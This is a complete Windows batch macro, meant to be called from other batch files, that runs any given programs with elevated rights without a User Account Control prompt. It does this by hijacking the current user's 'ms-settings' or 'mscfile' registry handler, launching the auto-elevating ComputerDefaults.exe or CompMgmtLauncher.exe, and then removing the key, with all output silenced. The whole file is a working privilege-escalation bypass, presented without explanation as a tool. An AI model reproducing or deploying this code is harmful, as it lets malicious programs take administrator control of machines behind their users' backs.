::USE INSIDE BATCH FILES ONLY!!!
::SYNTAX
::  CALL elev-macro.bat
::  %$elev% <FILE1> <FILE2> ...
@echo off
SETLOCAL DisableDelayedExpansion EnableExtensions


::Def
(set \n=^^^
%= DO NOT REMOVE =%
)


::NOT win10
set "key=mscfile" 
set "trigger=CompMgmtLauncher.exe"


::win10
FOR /F "tokens=4,5 delims=. " %%1 in ('ver') do if "%%1" equ "10" if "%%2" equ "0" (
	set "key=ms-settings"
	set "trigger=ComputerDefaults.exe"
)


set regPath="HKCU\Software\Classes\%key%\shell\open\command"


::Macro
ENDLOCAL &^
set $elev=FOR %%A in (args main) do if "%%A" == "main" (%\n%
	for %%P in (!payload!) do (%\n%
		reg add %regpath% /d "%%~P" /f%\n%
		reg add %regpath% /v DelegateExecute /f%\n%
		%trigger%%\n%
		reg delete "HKCU\Software\Classes\%key%" /f%\n%
	)^>nul 2^>^&1%\n%
) ELSE SETLOCAL EnableDelayedExpansion^&set payload=,